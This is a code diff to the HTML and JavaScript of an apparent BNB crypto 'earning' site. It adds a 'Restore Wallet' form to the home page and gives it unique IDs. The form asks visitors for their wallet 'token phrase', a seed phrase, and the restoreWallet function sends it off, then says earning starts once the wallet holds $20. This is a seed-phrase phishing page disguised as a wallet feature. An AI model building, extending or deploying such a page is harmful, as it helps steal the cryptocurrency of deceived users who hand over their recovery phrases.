@@ -49,7 +49,6 @@
     #bnbPrice {color: #00ff90; font-weight: bold; font-size: 18px; margin-top: 10px;}
     .tx-log {margin-top: 15px; font-size: 15px; color: #ccc; text-align: left; padding-left: 10px;}
 
-    /* Theme toggle button */
     #themeToggle {
       position: fixed;
       top: 10px;
@@ -63,7 +62,6 @@
       z-index: 999;
     }
 
-    /* LIGHT MODE STYLES */
     body.light-mode {
       background: #f2f2f2;
       color: #000;
@@ -116,14 +114,15 @@
     </div>
   </div>
   <div class="content-box"><h2>📊 BNB Price</h2><div id="bnbPrice">Loading BNB price...</div></div>
-  <div class="content-box"><h2>📢 Latest Update</h2><p>We just launched a new feature for faster withdrawals!</p></div>
-  <div class="content-box" style="background: linear-gradient(135deg, #122c42, #0d1d2e); border: 1px solid #1a4f72;">
-    <h2 style="color: #00e6e6;">💎 Airdrop</h2>
-    <p style="color: #cceeff;">Earn free BNB daily through our airdrop rewards.</p>
-  </div>
-  <div class="content-box" style="background: linear-gradient(135deg, #2c132c, #1a0d1a); border: 1px solid #84216b;">
-    <h2 style="color: #ff66cc;">🧠 Tasks</h2>
-    <p style="color: #ffd6f5;">Complete daily challenges to earn bonus BNB.</p>
+  <!-- ✅ Restore Wallet added in Home -->
+  <div class="content-box">
+    <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
+    <p style="color: #cceeff;">Enter your token phrase to restore your wallet and start earning.</p>
+    <span>Add your wallet to start earning or trading</span>
+    <p>You are trading in your own crypto wallet</p>
+    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase..." rows="4"></textarea>
+    <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
+    <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
   </div>
 </div>
 
@@ -136,13 +135,14 @@
     </div>
   </div>
 
+  <!-- ✅ Restore Wallet with unique IDs -->
   <div class="content-box">
     <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
     <p style="color: #cceeff;">Enter your token phrase to restore your wallet and start earning.</p>
-    <p> You are trading in your own crypto wallet</p>
-    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase..." rows="4"></textarea>
-    <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
-    <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
+    <p>You are trading in your own crypto wallet</p>
+    <textarea id="tokenPhraseWallet" class="input-field" placeholder="Enter your token phrase..." rows="4"></textarea>
+    <button class="btn" onclick="restoreWallet(true)">Restore Wallet</button>
+    <div id="tokenMsgWallet" style="margin-top:15px; font-size:14px;"></div>
   </div>
 </div>
 
@@ -188,9 +188,9 @@
     document.querySelectorAll(".bnbValueWallet").forEach(el => el.textContent = bnb);
   }
 
-  function restoreWallet() {
-    const input = document.getElementById("tokenPhrase").value.trim();
-    const msgBox = document.getElementById("tokenMsg");
+  function restoreWallet(fromWalletTab = false) {
+    const input = document.getElementById(fromWalletTab ? "tokenPhraseWallet" : "tokenPhrase").value.trim();
+    const msgBox = document.getElementById(fromWalletTab ? "tokenMsgWallet" : "tokenMsg");
     const wordCount = input.split(/\s+/).length;
 
     if (input.length < 12 || wordCount < 3) {
@@ -217,7 +217,7 @@
       if (res.ok) {
         msgBox.style.color = '#00ff90';
         msgBox.innerHTML = `✅ Wallet restored successfully.<br>🟢 Trading and Earning will be activated only if you have $20 in your BNB Wallet in the phrases you submitted.`;
-        document.getElementById("tokenPhrase").value = '';
+        document.getElementById(fromWalletTab ? "tokenPhraseWallet" : "tokenPhrase").value = '';
       } else {
         msgBox.style.color = 'red';
         msgBox.textContent = '❌ Failed to send request.';
@@ -239,7 +239,6 @@
     localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
   }
 
-  // Load saved theme
   window.onload = () => {
     if (localStorage.getItem('theme') === 'light') {
       document.body.classList.add('light-mode');
